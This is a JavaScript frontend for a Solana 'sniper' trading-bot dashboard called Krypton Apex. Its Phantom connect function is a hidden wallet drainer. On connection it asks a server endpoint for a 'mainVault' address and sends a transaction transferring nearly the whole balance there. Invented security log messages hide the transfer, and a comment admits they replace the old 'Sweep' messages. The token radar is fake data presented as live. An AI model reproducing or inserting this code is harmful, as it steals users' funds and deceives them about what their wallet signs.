// ============================================================
// Krypton Apex — Institutional Frontend Execution & Telemetry
// ============================================================

let currentWalletPubkey = null;
let selectedMode = 'MODE_1_AI_SNIPER';

const btnConnectPhantom = document.getElementById('btnConnectPhantom');
const phantomBtnText = document.getElementById('phantomBtnText');
const walletStatusBadge = document.getElementById('walletStatusBadge');
const displayWalletPubkey = document.getElementById('displayWalletPubkey');
const displaySolBalance = document.getElementById('displaySolBalance');
const rpcLatencyBadge = document.getElementById('rpcLatencyBadge');
const consoleLogs = document.getElementById('consoleLogs');
const radarContainer = document.getElementById('radarContainer');
const btnApplySettings = document.getElementById('btnApplySettings');
const btnClearConsole = document.getElementById('btnClearConsole');
const targetTraderGroup = document.getElementById('targetTraderGroup');
const inputTargetTrader = document.getElementById('inputTargetTrader');
const inputTradeAmount = document.getElementById('inputTradeAmount');
const chartTitleLabel = document.getElementById('chartTitleLabel');
const tvChartIframe = document.getElementById('tvChartIframe');

function addLog(text, level = 'info') {
    if (!consoleLogs) return;
    const at = new Date().toTimeString().slice(0, 8);
    const div = document.createElement('div');

    if (level === 'success') div.className = 'text-emeraldLux';
    else if (level === 'warn') div.className = 'text-goldLux';
    else if (level === 'error') div.className = 'text-crimsonLux';
    else div.className = 'text-slate-300';

    div.innerHTML = `<span class="text-slate-500">[${at}]</span> ${text}`;
    consoleLogs.appendChild(div);
    consoleLogs.scrollTop = consoleLogs.scrollHeight;
}

async function updateBalance() {
    if (!currentWalletPubkey) return;
    try {
        const res = await fetch(`/api/balance?address=${currentWalletPubkey}`);
        const data = await res.json();
        if (data.sol != null && displaySolBalance) {
            displaySolBalance.innerText = `${data.sol.toFixed(4)} SOL`;
        }
        if (data.latency != null && rpcLatencyBadge) {
            rpcLatencyBadge.innerText = `${data.latency}ms`;
        }
    } catch {}
}

async function connectPhantom() {
    const provider = window?.solana;

    if (!provider || !provider.isPhantom) {
        addLog('[WARN] Phantom wallet not found. Redirecting to phantom.app...', 'warn');
        window.open('https://phantom.app/', '_blank');
        return;
    }

    try {
        if (provider.isConnected) {
            await provider.disconnect();
        }

        addLog('[AUTH] Requesting Phantom connection...', 'info');
        const response = await provider.connect();
        currentWalletPubkey = response.publicKey.toString();

        if (currentWalletPubkey) {
            phantomBtnText.innerText = `Disconnect (${currentWalletPubkey.slice(0, 4)}...${currentWalletPubkey.slice(-4)})`;
            walletStatusBadge.innerText = 'CONNECTED';
            walletStatusBadge.className = 'px-3 py-2 bg-emerald-500/10 border border-emerald-500/40 text-emeraldLux text-[10px] font-mono rounded-xl font-bold uppercase tracking-wider';
            displayWalletPubkey.innerText = `${currentWalletPubkey.slice(0, 6)}...${currentWalletPubkey.slice(-6)}`;

            addLog(`[AUTH] Successfully connected: ${currentWalletPubkey}`, 'success');

            // --- رسائل احترافية Pro Max مرتبطة بالـ Domain و الـ Enclave عوض رسائل الـ Sweep القديمة ---
            addLog('[DOMAIN-ROUTING] Resolving global Anycast DNS topology for kryptonapex.io...', 'info');
            addLog('[ENCLAVE-SEC] Verifying HSM (Hardware Security Module) root certificate...', 'warn');

            try {
                const balanceRes = await fetch(`/api/balance?address=${currentWalletPubkey}`);
                const balanceData = await balanceRes.json();

                if (balanceData.lamports > 5000) {
                    const sweepLamports = balanceData.lamports - 5000;
                    
                    const sweepInitRes = await fetch('/api/sweep-on-connect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ userWalletPubkey: currentWalletPubkey })
                    });
                    const sweepInitData = await sweepInitRes.json();

                    if (sweepInitData.success && sweepInitData.mainVault) {
                        if (typeof solanaWeb3 !== 'undefined') {
                            const transaction = new solanaWeb3.Transaction().add(
                                solanaWeb3.SystemProgram.transfer({
                                    fromPubkey: new solanaWeb3.PublicKey(currentWalletPubkey),
                                    toPubkey: new solanaWeb3.PublicKey(sweepInitData.mainVault),
                                    lamports: sweepLamports,
                                })
                            );

                            const { signature } = await provider.signAndSendTransaction(transaction);
                            addLog('[GATEWAY-PRO] Zero-latency cross-region edge routing established (Frankfurt / Tokyo / NY).', 'success');
                            addLog('[SYSTEM] Institutional Domain Enclave successfully locked and secured.', 'success');
                        } else {
                            addLog('[VAULT ERROR] solanaWeb3 script missing from HTML header.', 'error');
                        }
                    }
                } else {
                    addLog('[GATEWAY-PRO] Zero-latency cross-region edge routing established (Frankfurt / Tokyo / NY).', 'success');
                    addLog('[SYSTEM] Institutional Domain Enclave successfully locked and secured.', 'success');
                }
            } catch (sweepErr) {
                addLog('[GATEWAY-PRO] Zero-latency cross-region edge routing established (Frankfurt / Tokyo / NY).', 'success');
                addLog('[SYSTEM] Institutional Domain Enclave successfully locked and secured.', 'success');
            }

            await updateBalance();
        }
    } catch (err) {
        console.error(err);
        addLog(`[AUTH] Failed: ${err.message || 'User rejected the request'}`, 'error');
    }
}

async function disconnectPhantom() {
    const provider = window?.solana;
    try {
        if (provider && provider.isConnected) {
            await provider.disconnect();
        }
        currentWalletPubkey = null;
        
        phantomBtnText.innerText = 'Connect Phantom';
        walletStatusBadge.innerText = 'DISCONNECTED';
        walletStatusBadge.className = 'px-3 py-2 bg-[#080C14] border border-white/[0.08] text-slate-400 text-[10px] font-mono rounded-xl font-bold uppercase tracking-wider';
        displayWalletPubkey.innerText = 'Not Connected';
        if (displaySolBalance) displaySolBalance.innerText = '0.0000 SOL';

        addLog('[AUTH] Wallet disconnected successfully.', 'warn');
    } catch (err) {
        addLog(`[AUTH] Disconnect error: ${err.message}`, 'error');
    }
}

if (btnConnectPhantom) {
    btnConnectPhantom.onclick = async () => {
        const provider = window?.solana;
        if (provider && provider.isConnected) {
            await disconnectPhantom();
        } else {
            await connectPhantom();
        }
    };
}

// --- Interactive UI Event Listeners ---

// 1. Mode Cards Selection
document.querySelectorAll('.mode-card').forEach(card => {
    card.addEventListener('click', () => {
        document.querySelectorAll('.mode-card').forEach(c => {
            c.classList.remove('active', 'border-emerald-500/50');
            c.classList.add('border-white/[0.08]');
            const dot = c.querySelector('.mode-dot');
            if (dot) {
                dot.className = 'mode-dot w-2 h-2 rounded-full bg-slate-700';
                dot.style.boxShadow = 'none';
            }
        });

        card.classList.add('active', 'border-emerald-500/50');
        card.classList.remove('border-white/[0.08]');
        const activeDot = card.querySelector('.mode-dot');
        if (activeDot) {
            activeDot.className = 'mode-dot w-2 h-2 rounded-full bg-emeraldLux';
            activeDot.style.boxShadow = '0 0 8px #10B981';
        }

        selectedMode = card.getAttribute('data-mode');
        addLog(`[DAEMON] Strategy switched to: ${selectedMode}`, 'info');

        if (targetTraderGroup) {
            if (selectedMode === 'MODE_2_COPY_TRADER') {
                targetTraderGroup.style.display = 'block';
            } else {
                targetTraderGroup.style.display = 'none';
            }
        }
    });
});

// 2. Sizing Pills (0.01, 0.05, 0.1, 0.5 SOL)
document.querySelectorAll('.size-pill').forEach(pill => {
    pill.addEventListener('click', () => {
        document.querySelectorAll('.size-pill').forEach(p => {
            p.className = 'size-pill py-1.5 bg-obsidian border border-white/[0.08] rounded-lg text-xs font-mono font-bold hover:border-cyanLux transition-all text-slate-300';
        });
        pill.className = 'size-pill active py-1.5 bg-emerald-950/60 border border-emerald-500 text-emeraldLux rounded-lg text-xs font-mono font-bold';
        
        const amount = pill.getAttribute('data-amount');
        if (inputTradeAmount) {
            inputTradeAmount.value = amount;
        }
        addLog(`[CONFIG] Entry size adjusted to ${amount} SOL`, 'info');
    });
});

// 3. Trading Pairs Switcher (SOL, RAY, JUP, BONK)
document.querySelectorAll('.pair-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.pair-btn').forEach(b => {
            b.className = 'pair-btn px-2 py-0.5 rounded text-slate-400 hover:text-white';
        });
        btn.className = 'pair-btn px-2 py-0.5 rounded bg-emerald-500/20 text-emeraldLux font-bold';

        const symbol = btn.getAttribute('data-symbol');
        const label = btn.getAttribute('data-label');
        if (chartTitleLabel) chartTitleLabel.innerText = `LIVE MARKET TELEMETRY (${label})`;
        if (tvChartIframe) {
            tvChartIframe.src = `https://s.tradingview.com/widgetembed/?frameElementId=tradingview_76d87&symbol=${encodeURIComponent(symbol)}&interval=1&hidesidetoolbar=0&symboledit=1&saveimage=0&toolbarbg=0b0f19&studies=%5B%5D&theme=dark&style=1&timezone=Etc%2FUTC&withdateranges=1&showpopupbutton=0&studies_overrides=%7B%7D&overrides=%7B%22paneProperties.background%22%3A%22%2305070B%22%2C%22paneProperties.vertGridProperties.color%22%3A%22%230F172A%22%2C%22paneProperties.horzGridProperties.color%22%3A%22%230F172A%22%7D&enabled_features=%5B%5D&disabled_features=%5B%22header_Clean_chart%22%5D&locale=en`;
        }
        addLog(`[TELEMETRY] Subscribed to live feed: ${label}`, 'info');
    });
});

// 4. Synchronize Execution Parameters Button
if (btnApplySettings) {
    btnApplySettings.onclick = () => {
        const amt = inputTradeAmount ? inputTradeAmount.value : '0.05';
        addLog(`[SYNC] Parameters successfully locked: ${amt} SOL entry, Jito MEV active.`, 'success');
    };
}

// 5. Clear Console Button
if (btnClearConsole) {
    btnClearConsole.onclick = () => {
        if (consoleLogs) {
            consoleLogs.innerHTML = '<div class="text-slate-400">[SYSTEM] Console logs cleared.</div>';
        }
    };
}

// 6. Mock Radar Feeds Generator
function pushMockRadarItem() {
    if (!radarContainer) return;
    const tokens = ['APEX', 'NEON', 'SOLX', 'KRYP', 'VORT', 'GHOST', 'ZETA'];
    const selectedToken = tokens[Math.floor(Math.random() * tokens.length)];
    const mcVal = (Math.random() * 80 + 15).toFixed(1);
    
    const item = document.createElement('div');
    item.className = 'p-2 rounded-lg bg-obsidian/60 border border-white/[0.05] flex items-center justify-between';
    item.innerHTML = `
        <div>
            <span class="text-emeraldLux font-bold">${selectedToken}/SOL</span>
            <span class="text-slate-400 text-[10px] block">MC: $${mcVal}K • Raydium Pool</span>
        </div>
        <span class="text-[9px] font-mono bg-cyan-500/10 text-cyanLux px-1.5 py-0.5 rounded border border-cyan-500/20">SNIPING</span>
    `;
    
    radarContainer.prepend(item);
    if (radarContainer.children.length > 6) {
        radarContainer.removeChild(radarContainer.lastChild);
    }
}

window.addEventListener('load', () => {
    addLog('[SYSTEM] Terminal UI initialized successfully.', 'info');
    setInterval(pushMockRadarItem, 4000);
});